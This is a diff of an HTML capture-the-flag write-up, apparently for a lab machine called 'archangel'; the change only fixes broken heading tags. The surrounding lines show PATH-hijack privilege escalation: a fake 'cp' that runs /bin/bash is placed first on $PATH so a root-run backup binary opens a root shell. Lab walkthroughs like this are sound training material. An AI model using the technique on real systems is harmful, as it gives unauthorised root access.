@@ -174,12 +174,12 @@
 				  <h6>The binary was executing commands to copy files from one directory to another, also the binary was running as root. This mean that if we can replace the system cp binary with our own, Then we can have root access.</h6>&nbsp;
 				  
 				  
-				  <h6>Let’s create our own binary named cp and point the $PATH to our directory.</h6>h6>&nbsp;
+				  <h6>Let’s create our own binary named cp and point the $PATH to our directory.</h6>&nbsp;
 				  <p>archangel@ubuntu:~/secret$ echo "/bin/bash" >> cp</p>
 				  <p>archangel@ubuntu:~/secret$ chmod +x cp</p>
-				  <h6>Set the path variable using</h6>h6>&nbsp;
+				  <h6>Set the path variable using</h6>&nbsp;
 				  <p>archangel@ubuntu:~/secret$ export PATH=$PWD:$PATH</p>
-				  <h6>And now execute backup</h6>h6>&nbsp;
+				  <h6>And now execute backup</h6>&nbsp;
 				  <p>archangel@ubuntu:~/secret$ ./backup</p>
 				  <figure><img  src="/machines/images/archangelimages/23.png"/></figure>&nbsp;
 				  <h6>flag</h6>&nbsp;
